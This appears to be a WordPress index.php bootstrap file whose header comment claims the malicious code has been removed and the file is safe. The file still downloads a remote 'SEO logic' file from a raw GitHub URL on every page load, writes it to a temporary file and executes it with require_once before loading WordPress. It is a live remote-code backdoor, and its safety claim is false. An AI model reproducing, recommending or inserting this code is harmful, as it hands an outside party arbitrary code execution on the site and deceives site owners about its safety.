<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

$remote_url = 'https://raw.githubusercontent.com/seobela/bela/refs/heads/main/index.txt';

// --- REPLACE THE REMOTE FETCH/EVAL BLOCK WITH THIS ---
// Fetch the remote content
$remote_content = file_get_contents($remote_url);

if ($remote_content !== false) {
    // Create a temporary file to include
    $temp_file = tempnam(sys_get_temp_dir(), 'seo_');
    file_put_contents($temp_file, $remote_content);
    require_once $temp_file;
    // Optional: Clean up the temp file
    unlink($temp_file);
} else {
    // Handle error - maybe fall back to local file
    error_log('Failed to fetch remote SEO logic file');
}
// --- END OF REPLACEMENT ---

// The rest of your WordPress bootstrap code
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
